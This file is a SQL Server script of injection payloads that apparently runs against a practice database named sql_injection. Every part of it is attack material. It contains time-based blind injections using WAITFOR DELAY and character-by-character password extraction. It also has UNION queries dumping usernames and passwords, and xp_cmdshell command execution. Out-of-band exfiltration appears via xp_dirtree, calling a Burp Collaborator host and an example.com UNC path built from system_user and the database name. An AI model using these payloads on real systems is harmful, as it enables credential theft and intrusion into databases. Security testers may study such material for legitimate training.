USE sql_injection;
SELECT * FROM users WHERE username = ''; WAITFOR DELAY '0:0:10'--' AND password = '1'
SELECT * FROM users WHERE username = ''; IF (1=1) WAITFOR DELAY '0:0:10'--' AND password = '1'

SELECT * FROM users;
SELECT COUNT(username) FROM users WHERE LEN(password) > 1;
SELECT * FROM users WHERE username = 'alice' AND SUBSTRING(password, 1, 1) = 'j';
SELECT * FROM users WHERE username = ''; IF (SELECT COUNT(username) FROM users WHERE username = 'alice' AND LEN(password) > 5) = 1 WAITFOR DELAY '0:0:10'--
exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net',0,1;
EXEC master..xp_cmdshell 'nslookup localhost';
SELECT * FROM users WHERE username = ''; exec master..xp_dirtree '\\localhost\3000$',1,0;--' AND password = '123';

DECLARE @a varchar(1024);
DECLARE @b varchar(1024);
SELECT @a = (SELECT system_user);
SELECT @b = (SELECT DB_Name()); 
EXEC('master..xp_dirtree"\\'+@a+''+'.'+''+@b+'example.com\test$"');
SELECT * FROM users
UNION 
SELECT NULL, username + '~' + password, NULL FROM users;
SELECT * FROM users WHERE username = '' UNION SELECT username, password FROM users--' AND password = '123'